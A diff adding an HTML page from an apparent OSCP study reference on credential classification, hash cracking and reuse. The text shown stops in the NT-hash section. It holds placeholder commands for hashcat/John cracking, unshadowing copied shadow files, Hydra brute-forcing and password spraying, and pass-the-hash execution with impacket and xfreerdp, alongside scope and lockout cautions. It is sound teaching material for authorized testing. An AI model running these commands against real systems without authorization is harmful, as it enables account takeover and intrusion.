@@ -1,0 +1,445 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Credential Classification, Cracking and Reuse — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#credential-record">Credential record</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#classify-before-acting">Classify before acting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#validate-one-known-password">Validate one known password</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#estimate-feasibility">Estimate feasibility</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#hashcat-baseline-and-meaningful-modes">Hashcat baseline and meaningful modes</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#john-the-ripper-workflow">John the Ripper workflow</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#keepass-database">KeePass database</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#ssh-private-key-passphrase">SSH private-key passphrase</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#linux-password-records">Linux password records</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#nt-hash">NT hash</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#net-ntlmv2-response">Net-NTLMv2 response</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#dcc2--cached-domain-logon">DCC2 / cached domain logon</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#kerberos-tickets-and-caches">Kerberos tickets and caches</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#credential-guard-boundary">Credential Guard boundary</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#failure-routing">Failure routing</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#re-enumerate-after-success">Re-enumerate after success</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#build-a-small-site-specific-wordlist-with-cewl">Build a small site-specific wordlist with CeWL</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#generate-usernames-from-observed-naming-conventions">Generate usernames from observed naming conventions</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#targeted-candidates--crunch-cupp-and-rules">Targeted candidates — Crunch, CUPP and rules</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#password-protected-zip--direct-test-or-extracted-verifier">Password-protected ZIP — direct test or extracted verifier</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#http-basic-authentication--validate-the-challenge-and-failure-signal">HTTP Basic authentication — validate the challenge and failure signal</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#change-an-accounts-own-expiredknown-smb-password">Change an account’s own expired/known SMB password</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#generate-a-bounded-numeric-list-for-an-observed-identifier-pattern">Generate a bounded numeric list for an observed identifier pattern</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#an-application-authenticates-to-your-explicit-smb-endpoint">An application authenticates to your explicit SMB endpoint</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/#sources">Sources</a></li></ul></details><ul><li><details open><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details open><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/" aria-current="page">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="credential-classification-cracking-and-reuse">Credential Classification, Cracking and Reuse</h1>
+<p><a href="/oscp/reference/04-shells-transfers-credentials/">← Stage index</a> | <a href="/oscp/cheatsheets/credentials-cracking/">Credential cheatsheet</a> | <a href="/oscp/reference/06-ad-lateral-movement/">AD procedures</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a>; <a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></p>
+<blockquote>
+<p><strong>Purpose:</strong> distinguish authentication material, estimate whether offline recovery is worthwhile, and test only compatible, evidence-backed uses. Actual credentials belong in private records.</p>
+</blockquote>
+<h2 id="credential-record">Credential record</h2>
+<pre><code class="language-text">SOURCE -> MATERIAL/FORMAT -> LOCAL/DOMAIN/APPLICATION IDENTITY
+-> POSSIBLE USE -> SERVICE/PROTOCOL -> AUTHENTICATION
+-> AUTHORIZATION -> NEW ACCESS -> RE-ENUMERATION
+</code></pre>
+<p>Record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together.</p>
+<h2 id="classify-before-acting">Classify before acting</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Material</th><th>Recognition</th><th>Compatible use</th></tr></thead><tbody><tr><td>Cleartext password</td><td>Text tied to an identity/source</td><td>Normal protocol/application login</td></tr><tr><td>SSH private key</td><td>OpenSSH/PEM private-key block</td><td>SSH public-key authentication; recover passphrase offline if protected</td></tr><tr><td>Linux password record</td><td><code>USER:$id$salt$digest:...</code></td><td>Offline recovery with complete record/format</td></tr><tr><td>Application/file verifier</td><td>Tool-specific <code>$...$</code> or documented digest</td><td>Offline recovery with matching mode/parser</td></tr><tr><td>NT hash</td><td>Usually 32 hex from SAM/LSASS/NTDS context</td><td>Offline recovery; PtH where NTLM and the client support it</td></tr><tr><td>Net-NTLMv2 response</td><td><code>USER::DOMAIN:challenge:proof:blob</code></td><td>Offline recovery or live relay under specific conditions; not PtH material</td></tr><tr><td>DCC2/MSCache v2</td><td>Username-dependent cached-domain verifier</td><td>Offline recovery; not ordinary PtH material</td></tr><tr><td>Kerberos ticket</td><td><code>.kirbi</code>, ccache or in-memory cache</td><td>Ticket-specific access subject to realm, SPN, validity, clock and route</td></tr><tr><td>Kerberos roast material</td><td><code>$krb5asrep$...</code> or <code>$krb5tgs$...</code></td><td>Offline recovery with matching enctype/mode</td></tr><tr><td>Session/API token</td><td>Cookie, bearer/JWT or application token</td><td>Issuing application and authorization context only</td></tr></tbody></table>
+<p>Do not feed unknown strings into random modes. Preserve the source and identity context, then identify the format:</p>
+<pre><code class="language-bash">hashid HASH_OR_FILE
+john --list=formats | grep -i KEYWORD
+hashcat -hh | grep -i KEYWORD
+hashcat --example-hashes | less
+</code></pre>
+<blockquote>
+<p><strong>Failure cue:</strong> <code>No hashes loaded</code>, token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password.</p>
+</blockquote>
+<h2 id="validate-one-known-password">Validate one known password</h2>
+<p>Use the normal client for the observed service:</p>
+<pre><code class="language-bash">ssh -o PreferredAuthentications=password -p PORT USER@TARGET
+nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
+evil-winrm -i TARGET -u USER -p 'PASSWORD'
+xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore
+</code></pre>
+<p>Local Windows account:</p>
+<pre><code class="language-bash">nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> the destination service accepts the intended identity. Share, session or action access is a separate authorization result.</p>
+</blockquote>
+<details>
+<summary><strong>Variant — known user, targeted password dictionary</strong></summary>
+<pre><code class="language-bash">hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET
+hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET
+</code></pre>
+<p>Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client.</p>
+</details>
+<details>
+<summary><strong>Variant — one password across an authorized user list</strong></summary>
+<pre><code class="language-bash">hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET
+nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success
+</code></pre>
+<p>One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first.</p>
+</details>
+<details>
+<summary><strong>Variant — HTTP POST form</strong></summary>
+<p>Capture a correct request and stable failure marker with Burp:</p>
+<pre><code class="language-bash">hydra -l USER -P WORDLIST TARGET http-post-form \
+  '/LOGIN_PATH:username=^USER^&#x26;password=^PASS^:F=STABLE_FAILURE_TEXT'
+</code></pre>
+<p>Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives.</p>
+</details>
+<details>
+<summary><strong>RunasCs — test a known password from an existing Windows shell</strong></summary>
+<p>Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password.</p>
+<pre><code class="language-cmd">REM Domain account: verify the new process token
+RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN
+
+REM Local account: omit the domain switch for the current host's account
+RunasCs.exe USER PASSWORD "cmd /c whoami /all"
+
+REM Network-only credentials: local identity stays unchanged
+RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9
+</code></pre>
+<blockquote>
+<p><strong>Read:</strong> in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource.</p>
+</blockquote>
+<p><a href="https://github.com/antonioCoco/RunasCs">RunasCs upstream</a>. Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token.</p>
+</details>
+<h2 id="estimate-feasibility">Estimate feasibility</h2>
+<pre><code class="language-bash">hashcat -b -m MODE
+python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)"
+</code></pre>
+<p>Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order:</p>
+<pre><code class="language-text">exact recovered/default candidates -> organization/user/product words
+-> observed policy and mutations -> small dictionary plus rules
+-> known mask/hybrid -> broader curated lists/rules
+-> exhaustive search only when its measured cost is defensible
+</code></pre>
+<p>Preview mutations before spending the candidate budget:</p>
+<pre><code class="language-bash">hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50
+john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50
+</code></pre>
+<h2 id="hashcat-baseline-and-meaningful-modes">Hashcat baseline and meaningful modes</h2>
+<pre><code class="language-bash">hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
+hashcat -m MODE hashes.txt --show
+</code></pre>
+<blockquote>
+<p><code>-a 0</code> is dictionary mode. Do not use <code>-a 3</code> with a wordlist; attack mode 3 expects a mask.</p>
+</blockquote>
+<p>Common source examples identify NTLM as mode <code>1000</code>, Net-NTLMv2 as <code>5600</code> and KeePass as <code>13400</code>, but confirm against the installed version:</p>
+<pre><code class="language-bash">hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH'
+</code></pre>
+<details>
+<summary><strong>Mask and session variants</strong></summary>
+<pre><code class="language-bash">hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask
+hashcat --session targeted-mask --restore
+</code></pre>
+<blockquote>
+<p>Mask order is a hypothesis about structure. Estimate its keyspace before committing time.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>Hybrid variant — base word plus three digits</strong></summary>
+<pre><code class="language-bash">hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid
+</code></pre>
+<p>Use only when evidence supports both the base words and suffix shape.</p>
+</details>
+<h2 id="john-the-ripper-workflow">John the Ripper workflow</h2>
+<pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+</code></pre>
+<pre><code class="language-bash">john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
+john --session=crack-job --wordlist=wordlist.txt hash.txt
+john --restore=crack-job
+</code></pre>
+<p>File-to-hash converters:</p>
+<pre><code class="language-bash">zip2john archive.zip > archive.hash
+7z2john archive.7z > archive.hash
+ssh2john id_rsa > ssh.hash
+keepass2john vault.kdbx > keepass.hash
+pdf2john document.pdf > pdf.hash
+office2john document.docx > office.hash
+rar2john archive.rar > rar.hash
+unshadow passwd.copy shadow.copy > linux.hash
+</code></pre>
+<p>Converter availability varies by package/path; locate it rather than assuming:</p>
+<pre><code class="language-bash">command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null
+</code></pre>
+<blockquote>
+<p>Preserve the complete converter output. Some formats include a filename label before <code>:</code> that John accepts but Hashcat may require removed from a separate tool-specific copy.</p>
+</blockquote>
+<h2 id="keepass-database">KeePass database</h2>
+<pre><code class="language-bash">keepass2john vault.kdbx > keepass.hash
+john --wordlist=wordlist.txt keepass.hash
+john --show keepass.hash
+</code></pre>
+<p>Hashcat alternative after confirming KDBX/KDF and input format:</p>
+<pre><code class="language-bash">hashcat -hh | grep -i keepass
+hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 13400 keepass.hash --show
+</code></pre>
+<blockquote>
+<p>Mode <code>13400</code> covers common KeePass 1/2 AES formats. Installed help and example hashes decide for the actual file. A recovered master password still requires opening and validating the vault.</p>
+</blockquote>
+<h2 id="ssh-private-key-passphrase">SSH private-key passphrase</h2>
+<pre><code class="language-bash">ssh2john id_rsa > ssh.hash
+john --wordlist=wordlist.txt ssh.hash
+john --show ssh.hash
+chmod 600 id_rsa
+ssh-keygen -y -f id_rsa > derived.pub
+ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET
+</code></pre>
+<blockquote>
+<p>Cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. <code>Permission denied (publickey)</code> can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock.</p>
+</blockquote>
+<details>
+<summary><strong>Hashcat variant — only for a supported OpenSSH format</strong></summary>
+<pre><code class="language-bash">hashcat -hh | grep -i 'OpenSSH\|Private Key'
+hashcat -a 0 -m MODE ssh.hash wordlist.txt -r RULE_FILE
+</code></pre>
+<p>Choose <code>MODE</code> from the complete <code>$sshng$...</code> structure and installed help. Token-length or unsupported-cipher errors require a compatible parser/tool, not <code>--force</code> with a wrong mode.</p>
+</details>
+<h2 id="linux-password-records">Linux password records</h2>
+<pre><code class="language-bash">unshadow passwd.copy shadow.copy > linux.hash
+john --wordlist=wordlist.txt --rules=Jumbo linux.hash
+john --show linux.hash
+</code></pre>
+<blockquote>
+<p>Preserve username, UID, shell and lock markers. A recovered password does not override SSH settings, <code>su</code> policy or a disabled account.</p>
+</blockquote>
+<h2 id="nt-hash">NT hash</h2>
+<p>Offline recovery:</p>
+<pre><code class="language-bash">hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+john --format=NT --wordlist=wordlist.txt nt.hash
+</code></pre>
+<p>Compatible SMB validation:</p>
+<pre><code class="language-bash">nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares
+smbclient //TARGET/SHARE -U 'DOMAIN\USER' --pw-nt-hash NT_HASH
+</code></pre>
+<blockquote>
+<p>NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material.</p>
+</blockquote>
+<details>
+<summary><strong>Variant — remote access/execution when the identity has matching rights</strong></summary>
+<pre><code class="language-bash">impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore
+</code></pre>
